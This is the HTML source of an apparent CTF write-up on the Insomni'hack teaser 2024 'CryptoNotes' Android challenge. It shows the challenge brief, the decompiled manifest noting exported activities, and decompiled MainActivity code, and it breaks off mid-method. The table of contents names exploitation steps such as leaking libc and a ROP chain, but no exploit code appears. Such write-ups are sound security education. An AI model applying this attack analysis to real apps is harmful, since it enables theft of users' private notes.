@@ -1,0 +1,671 @@
+<!doctype html><html lang=en><head><meta name=viewport content="width=device-width"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=7"><link rel=icon href=/cyberpunk-cat32x32.png><link rel="shortcut icon" href=/cyberpunk-cat32x32.ico type=image/x-icon><link rel=apple-touch-icon href=/cyberpunk-cat180x180.png><title>How dare you Intent to pwn me! - Insomni'hack teaser 2024 &ndash;
+Nikolaos Chalkiadakis
+</title><link href=/symbols-nerd-font/symbols-nerd-font.css rel=stylesheet integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="><link href=/jetbrains-mono/jetbrains-mono.css rel=stylesheet integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="><link type=text/css rel=stylesheet href=https://chalkiadakis.me/css/styles.d9bb6446855e3e95409ba61aaf08c0b870eafc96a718853c9b9454c0b340e0735bcc9e6542ef9aa75d1aa9983fab319a53cc9997170c5d05032ff5d229a4cb9f.css integrity="sha512-2btkRoVePpVAm6YarwjAuHDq/JanGIU8m5RUwLNA4HNbzJ5lQu+ap10aqZg/qzGaU8yZlxcMXQUDL/XSKaTLnw=="><script type=text/javascript src=/fontawesome/all.min.js></script><meta name=author content="Nikolaos Chalkiadakis"><meta name=keywords content="Android,ctf,insomni'hack,pwn"><meta name=description content="uption vulnerabilities in Android applications are not exploitable?"><meta property="og:site_name" content='Nikolaos Chalkiadakis'><meta property="og:title" content="How dare you Intent to pwn me! - Insomni'hack teaser 2024"><meta property="og:type" content="article"><meta property="article:author" content="Nikolaos Chalkiadakis"><meta property="article:published_time" content='2024-02-24T00:00:01Z+0000'><meta property="article:tag" content="Android"><meta property="article:tag" content="ctf"><meta property="article:tag" content="insomni'hack"><meta property="article:tag" content="pwn"><meta property="og:url" content="https://chalkiadakis.me/posts/insomnihack-teaser24/cryptonotes/"><meta property="og:image" content="https://chalkiadakis.me/post-resources/cryptonotes/cover.png"><meta property="og:description" content="Who said memory corruption vulnerabilities in Android applications are not exploitable?"><meta name=twitter:card content="summary_large_image"><meta property="twitter:domain" content='chalkiadakis.me'><meta property="twitter:url" content="https://chalkiadakis.me/posts/insomnihack-teaser24/cryptonotes/"><meta name=twitter:title content="How dare you Intent to pwn me! - Insomni'hack teaser 2024"><meta name=twitter:image content="https://chalkiadakis.me/post-resources/cryptonotes/cover.png"><meta name=twitter:description content="Who said memory corruption vulnerabilities in Android applications are not exploitable?"><link rel=manifest href=/manifest/index.json></head><body><div id=baseContainer><header><div class=titleAndSearchContainer><div id=titleContainer><a class=unstyledLink href=/><img src=/cyberpunk-cat512x512.png alt=Logo></a><div class=rightOfLogo><div class=titleAndHamburger><h1><a class=unstyledLink href=/>Nikolaos Chalkiadakis</a></h1></div><div id=wide_nav><nav><ul id=main-nav><li><a href=/>Home</a></li><li><a href=/posts>Posts</a></li><li><a href=/whoami/>whoami</a></li><li><a href=/tags>Tags</a></li></ul></nav></div></div></div><div class=search><input id=searchbar type=text placeholder=Search>
+<a class=nerdlink onclick=newSearch()>&#xf002;</a></div><script>function newSearch(){let e=searchbar.value.trim();if(!e)return;location.href=`/search?q=${e}`}searchbar.onkeyup=e=>{e.keyCode==13&&newSearch()}</script></div><div id=links><a rel=noreferrer target=_blank class=nerdlink href=https://github.com/nikosChalk>&#xf09b;
+<span>GitHub
+</span></a><a rel=noreferrer target=_blank class=nerdlink href=https://www.linkedin.com/in/chalkn>&#xf0e1;
+<span>LinkedIn
+</span></a><a rel=noreferrer target=_blank class=nerdlink href=https://ctftime.org/user/128082><img src=/ctf-timefavicon.png width=14px>
+<span>CTFTime</span></a></div></header><div id=contentContainer><div id=content><main><article class="card single"><h1>How dare you Intent to pwn me! - Insomni'hack teaser 2024</h1><p class=date><span title=Date> </span>2024, February 24</p><div class=articleToc style=display:flex><div><nav id=TableOfContents><ul><li><a href=#initial-interaction>Initial interaction</a></li><li><a href=#reversing>Reversing</a><ul><li><a href=#bug-bug-where-are-you-bug>Bug, bug, where are you bug?</a></li><li><a href=#hello-memory-corruption>Hello memory corruption</a></li></ul></li><li><a href=#exploitation-through-intents>Exploitation through Intents</a><ul><li><a href=#debugging-environment>Debugging environment</a></li><li><a href=#defeating-the-canary>Defeating the canary</a></li><li><a href=#leaking-libc>Leaking libc</a></li><li><a href=#exfiltrating-data>Exfiltrating data</a></li><li><a href=#building-a-rop-chain>Building a ROP chain</a></li></ul></li></ul></nav></div><div style=flex:1><figure style=margin:0><img src=/post-resources/cryptonotes/cover.png alt></figure></div></div><hr><div><p><span class=inline-h4>PoC:</span> <a href=https://github.com/nikosChalk/ctf-writeups/tree/master/insomnihack2024/CryptoNotes/solution/MaliciousApp target=_blank>github.com/nikosChalk/ctf-writeups/tree/master/insomnihack2024/CryptoNotes/solution/MaliciousApp</a></p><p><span class=inline-h4>Categories:</span> Pwn, Android</p><p><span class=inline-h4>Description:</span></p><blockquote><p>Insomni&rsquo;Hack Teaser 2024 - CryptoNotes</p><p>Our security researcher saved a sensitive note in his new note-taking application. I convinced him to install your mobile application and start the main activity on his device, please find a way to leak the notes.</p><p>System running: <code>system-images;android-30;google_apis_playstore;x86_64</code><br>Submitting server: <a href=https://cryptonotes.insomnihack.ch:44300 target=_blank rel="noopener noreferrer">https://cryptonotes.insomnihack.ch:44300</a><br>Note App: <a href=https://github.com/nikosChalk/ctf-writeups/blob/master/insomnihack2024/CryptoNotes/resources/app-a91690d6479014d533bea108755aba2424b45b4b416823ed0c821ae421f820eb.apk target=_blank rel="noopener noreferrer">notes.apk</a> [archived]</p><p>The flag format is: <code>INS{NoteContent}</code></p><p>author: dai</p></blockquote><p>So, for this challenge:</p><ol><li>We are given a note-keeping application which is <em>supposedly secure</em>.</li><li>We are requested to write an arbitrary application and submit it to the system.</li><li>Both applications will run in an emulator in the following environment: <code>system-images;android-30;google_apis_playstore;x86_64</code></li></ol><hr><h2 id=initial-interaction>Initial interaction</h2><p>Let&rsquo;s start the application and see what it is doing:</p><div class=side-by-side-container><img class=side-by-side style=height:var(--default_p5_ss_height) alt=main-screen1 src=/post-resources/cryptonotes/main-screen1.png>
+<img class=side-by-side style=height:var(--default_p5_ss_height) alt=main-screen2 src=/post-resources/cryptonotes/main-screen2.png></div><p>As we can see, the application is a simple note-keeping application. It gives us 3 options:</p><ol><li>Add a plaintext note</li><li>Add an encrypted note using algorithm A1 (ALG1)</li><li>Add an encrypted note using algorithm A2 (ALG2)</li></ol><p>Once the notes are saved, we can no longer edit them. Only delete them. The flag is saved as one of these notes in the remote.</p><h2 id=reversing>Reversing</h2><p>Reversing mobile applications is easy as they are written in Java/Kotlin. Let&rsquo;s throw the application in JADX.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;manifest</span> <span style=color:#a6e22e>xmlns:android=</span><span style=color:#e6db74>&#34;http://schemas.android.com/apk/res/android&#34;</span> <span style=color:#a6e22e>android:versionCode=</span><span style=color:#e6db74>&#34;1&#34;</span> <span style=color:#a6e22e>android:versionName=</span><span style=color:#e6db74>&#34;1.0&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>android:compileSdkVersion=</span><span style=color:#e6db74>&#34;33&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>android:compileSdkVersionCodename=</span><span style=color:#e6db74>&#34;13&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>package=</span><span style=color:#e6db74>&#34;com.inso.ins24&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>platformBuildVersionCode=</span><span style=color:#e6db74>&#34;33&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>platformBuildVersionName=</span><span style=color:#e6db74>&#34;13&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;uses-sdk</span> <span style=color:#a6e22e>android:minSdkVersion=</span><span style=color:#e6db74>&#34;21&#34;</span> <span style=color:#a6e22e>android:targetSdkVersion=</span><span style=color:#e6db74>&#34;33&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;uses-permission</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;READ_EXTERNAL_STORAGE&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;uses-permission</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.permission.INTERNET&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;permission</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.inso.ins24.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION&#34;</span> <span style=color:#a6e22e>android:protectionLevel=</span><span style=color:#e6db74>&#34;signature&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;uses-permission</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.inso.ins24.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;application</span> <span style=color:#a6e22e>android:theme=</span><span style=color:#e6db74>&#34;@style/Theme_Ins24&#34;</span> <span style=color:#a6e22e>android:label=</span><span style=color:#e6db74>&#34;@string/app_name&#34;</span> <span style=color:#a6e22e>android:icon=</span><span style=color:#e6db74>&#34;@mipmap/ic_launcher&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:debuggable=</span><span style=color:#e6db74>&#34;true&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:allowBackup=</span><span style=color:#e6db74>&#34;false&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:supportsRtl=</span><span style=color:#e6db74>&#34;true&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:fullBackupContent=</span><span style=color:#e6db74>&#34;@xml/backup_rules&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:roundIcon=</span><span style=color:#e6db74>&#34;@mipmap/ic_launcher_round&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:appComponentFactory=</span><span style=color:#e6db74>&#34;androidx.core.app.CoreComponentFactory&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>android:dataExtractionRules=</span><span style=color:#e6db74>&#34;@xml/data_extraction_rules&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.inso.ins24.NoteAPIActivity&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.inso.ins24.NoteViewActivity&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;false&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.inso.ins24.NoteEditorActivity&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;false&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;activity</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;com.inso.ins24.MainActivity&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;true&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;intent-filter&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.action.MAIN&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>                <span style=color:#f92672>&lt;category</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;android.intent.category.LAUNCHER&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;/intent-filter&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/activity&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;provider</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;androidx.startup.InitializationProvider&#34;</span> <span style=color:#a6e22e>android:exported=</span><span style=color:#e6db74>&#34;false&#34;</span> <span style=color:#a6e22e>android:authorities=</span><span style=color:#e6db74>&#34;com.inso.ins24.androidx-startup&#34;</span><span style=color:#f92672>&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;meta-data</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;androidx.emoji2.text.EmojiCompatInitializer&#34;</span> <span style=color:#a6e22e>android:value=</span><span style=color:#e6db74>&#34;androidx.startup&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>            <span style=color:#f92672>&lt;meta-data</span> <span style=color:#a6e22e>android:name=</span><span style=color:#e6db74>&#34;androidx.lifecycle.ProcessLifecycleInitializer&#34;</span> <span style=color:#a6e22e>android:value=</span><span style=color:#e6db74>&#34;androidx.startup&#34;</span><span style=color:#f92672>/&gt;</span>
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/provider&gt;</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/application&gt;</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/manifest&gt;</span>
+</span></span></code></pre></div><p>From the application&rsquo;s AndroidManifest.xml we can make the following observations:</p><ul><li>There are 2 <code>exported</code> activities. <code>exported</code> components allow us to interact with the target application from another application (i.e. interact from the application that we will write).</li><li><code>DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION</code> is not interesting as it is standard Android 13 behavior and with correct <code>protectionLevel="signature"</code></li><li>The target can do network communication (<code>android.permission.INTERNET</code>)</li><li>The target has <code>READ_EXTERNAL_STORAGE</code> and since the target runs on <code>android-30</code> (<code>Build.VERSION_CODES.R</code>), it is also automatically granted the <code>WRITE_EXTERNAL_STORAGE</code> permission.</li><li>The target has <code>debuggable="true"</code>, although I am uncertain if this is exploitable from the context of another application.</li></ul><p>Here are also the application&rsquo;s classes:</p><p><img src=/post-resources/cryptonotes/class-layout.png alt=class-layout></p><p>So, let&rsquo;s start with the <code>MainActivity</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> com.inso.ins24;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.app.AlertDialog;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.content.DialogInterface;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.content.Intent;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.content.SharedPreferences;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.os.Bundle;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.view.Menu;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.view.MenuItem;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.view.View;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.widget.AdapterView;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.widget.ArrayAdapter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.widget.ListAdapter;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.widget.ListView;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> android.widget.TextView;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> androidx.appcompat.app.AppCompatActivity;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.google.gson.Gson;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.inso.ins24.utils.CryptoConfig;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.ArrayList;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashSet;
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.List;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* loaded from: classes4.dex */</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MainActivity</span> <span style=color:#66d9ef>extends</span> AppCompatActivity {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> ArrayAdapter adapter;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> String cryptoConfig <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;{&#39;ALGO&#39;:[65,76,71,79,49],&#39;IN&#39;:&#39;this is a notes&#39;}&#34;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> CryptoConfig cryptoconf;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> Gson gson;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> List<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> notes2;
+</span></span><span style=display:flex><span>    TextView emptyTv;
+</span></span><span style=display:flex><span>    ListView notesListView;
+</span></span><span style=display:flex><span>    SharedPreferences sharedPreferences;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>static</span> {
+</span></span><span style=display:flex><span>        Gson gson2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Gson();
+</span></span><span style=display:flex><span>        gson <span style=color:#f92672>=</span> gson2;
+</span></span><span style=display:flex><span>        cryptoconf <span style=color:#f92672>=</span> (CryptoConfig) gson2.<span style=color:#a6e22e>fromJson</span>(cryptoConfig, (Class<span style=color:#f92672>&lt;</span>Object<span style=color:#f92672>&gt;</span>) CryptoConfig.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> String <span style=color:#a6e22e>encrypt</span>(String note, <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> algo) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> CryptoConfig.<span style=color:#a6e22e>docipher</span>(algo, note);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>onCreate</span>(Bundle savedInstanceState) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>onCreate</span>(savedInstanceState);
+</span></span><span style=display:flex><span>        setContentView(R.<span style=color:#a6e22e>layout</span>.<span style=color:#a6e22e>activity_main</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>notesListView</span> <span style=color:#f92672>=</span> (ListView) findViewById(R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>notes_ListView</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>emptyTv</span> <span style=color:#f92672>=</span> (TextView) findViewById(R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>emptyTv</span>);
+</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>loadLibrary</span>(<span style=color:#e6db74>&#34;ins24&#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (getIntent().<span style=color:#a6e22e>hasExtra</span>(<span style=color:#e6db74>&#34;exit&#34;</span>)) {
+</span></span><span style=display:flex><span>            finish();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sharedPreferences</span> <span style=color:#f92672>=</span> getSharedPreferences(<span style=color:#e6db74>&#34;com.inso.ins24.mynotes&#34;</span>, 0);
+</span></span><span style=display:flex><span>        notes2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList();
+</span></span><span style=display:flex><span>        HashSet<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> noteSet2 <span style=color:#f92672>=</span> (HashSet) <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sharedPreferences</span>.<span style=color:#a6e22e>getStringSet</span>(<span style=color:#e6db74>&#34;notes&#34;</span>, <span style=color:#66d9ef>null</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (noteSet2 <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>||</span> noteSet2.<span style=color:#a6e22e>isEmpty</span>()) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>emptyTv</span>.<span style=color:#a6e22e>setVisibility</span>(0);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>emptyTv</span>.<span style=color:#a6e22e>setVisibility</span>(8);
+</span></span><span style=display:flex><span>            notes2 <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayList(noteSet2);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        ArrayAdapter arrayAdapter <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ArrayAdapter(getApplicationContext(), (<span style=color:#66d9ef>int</span>) R.<span style=color:#a6e22e>layout</span>.<span style=color:#a6e22e>custom_note_row</span>, (<span style=color:#66d9ef>int</span>) R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>notesTV</span>, notes2);
+</span></span><span style=display:flex><span>        adapter <span style=color:#f92672>=</span> arrayAdapter;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>notesListView</span>.<span style=color:#a6e22e>setAdapter</span>((ListAdapter) arrayAdapter);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>notesListView</span>.<span style=color:#a6e22e>setOnItemClickListener</span>(<span style=color:#66d9ef>new</span> AdapterView.<span style=color:#a6e22e>OnItemClickListener</span>() { <span style=color:#75715e>// from class: com.inso.ins24.MainActivity.1</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.widget.AdapterView.OnItemClickListener</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>onItemClick</span>(AdapterView<span style=color:#f92672>&lt;?&gt;</span> parent, View view, <span style=color:#66d9ef>int</span> position, <span style=color:#66d9ef>long</span> id) {
+</span></span><span style=display:flex><span>                Intent intent <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Intent(MainActivity.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>getApplicationContext</span>(), NoteViewActivity.<span style=color:#a6e22e>class</span>);
+</span></span><span style=display:flex><span>                intent.<span style=color:#a6e22e>putExtra</span>(<span style=color:#e6db74>&#34;noteId&#34;</span>, position);
+</span></span><span style=display:flex><span>                MainActivity.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>startActivity</span>(intent);
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        });
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>notesListView</span>.<span style=color:#a6e22e>setOnItemLongClickListener</span>(<span style=color:#66d9ef>new</span> AdapterView.<span style=color:#a6e22e>OnItemLongClickListener</span>() { <span style=color:#75715e>// from class: com.inso.ins24.MainActivity.2</span>
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.widget.AdapterView.OnItemLongClickListener</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>onItemLongClick</span>(AdapterView<span style=color:#f92672>&lt;?&gt;</span> parent, View view, <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> position, <span style=color:#66d9ef>long</span> id) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> AlertDialog.<span style=color:#a6e22e>Builder</span>(MainActivity.<span style=color:#a6e22e>this</span>).<span style=color:#a6e22e>setTitle</span>(<span style=color:#e6db74>&#34;Are you sure ?&#34;</span>).<span style=color:#a6e22e>setMessage</span>(<span style=color:#e6db74>&#34;Do you want to delete this note&#34;</span>).<span style=color:#a6e22e>setPositiveButton</span>(<span style=color:#e6db74>&#34;Yes&#34;</span>, <span style=color:#66d9ef>new</span> DialogInterface.<span style=color:#a6e22e>OnClickListener</span>() { <span style=color:#75715e>// from class: com.inso.ins24.MainActivity.2.1</span>
+</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.content.DialogInterface.OnClickListener</span>
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>onClick</span>(DialogInterface dialog, <span style=color:#66d9ef>int</span> which) {
+</span></span><span style=display:flex><span>                        MainActivity.<span style=color:#a6e22e>notes2</span>.<span style=color:#a6e22e>remove</span>(position);
+</span></span><span style=display:flex><span>                        MainActivity.<span style=color:#a6e22e>adapter</span>.<span style=color:#a6e22e>notifyDataSetChanged</span>();
+</span></span><span style=display:flex><span>                        HashSet<span style=color:#f92672>&lt;</span>String<span style=color:#f92672>&gt;</span> noteSet <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashSet<span style=color:#f92672>&lt;&gt;</span>(MainActivity.<span style=color:#a6e22e>notes2</span>);
+</span></span><span style=display:flex><span>                        MainActivity.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>sharedPreferences</span>.<span style=color:#a6e22e>edit</span>().<span style=color:#a6e22e>putStringSet</span>(<span style=color:#e6db74>&#34;notes&#34;</span>, noteSet).<span style=color:#a6e22e>apply</span>();
+</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>if</span> (noteSet.<span style=color:#a6e22e>isEmpty</span>()) {
+</span></span><span style=display:flex><span>                            MainActivity.<span style=color:#a6e22e>this</span>.<span style=color:#a6e22e>emptyTv</span>.<span style=color:#a6e22e>setVisibility</span>(0);
+</span></span><span style=display:flex><span>                        }
+</span></span><span style=display:flex><span>                    }
+</span></span><span style=display:flex><span>                }).<span style=color:#a6e22e>setNegativeButton</span>(<span style=color:#e6db74>&#34;No&#34;</span>, (DialogInterface.<span style=color:#a6e22e>OnClickListener</span>) <span style=color:#66d9ef>null</span>).<span style=color:#a6e22e>show</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        });
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.app.Activity</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>onCreateOptionsMenu</span>(Menu menu) {
+</span></span><span style=display:flex><span>        getMenuInflater().<span style=color:#a6e22e>inflate</span>(R.<span style=color:#a6e22e>menu</span>.<span style=color:#a6e22e>add_note_menu</span>, menu);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>onCreateOptionsMenu</span>(menu);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.app.Activity</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>onOptionsItemSelected</span>(MenuItem item) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>super</span>.<span style=color:#a6e22e>onOptionsItemSelected</span>(item);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (item.<span style=color:#a6e22e>getItemId</span>() <span style=color:#f92672>==</span> R.<span style=color:#a6e22e>id</span>.<span style=color:#a6e22e>add_note</span>) {
